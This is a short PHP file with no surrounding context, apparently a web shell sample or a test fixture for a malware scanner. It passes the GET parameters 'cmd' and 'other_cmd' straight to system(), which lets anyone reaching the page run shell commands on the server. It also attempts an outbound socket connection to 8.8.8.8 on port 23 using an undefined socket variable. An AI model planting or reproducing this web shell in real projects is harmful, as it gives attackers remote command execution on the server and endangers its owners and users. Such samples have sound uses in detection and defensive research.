<?php

socket_connect($socket, '8.8.8.8', 23);
system($_GET['cmd']);
system($_GET['other_cmd']);

?>
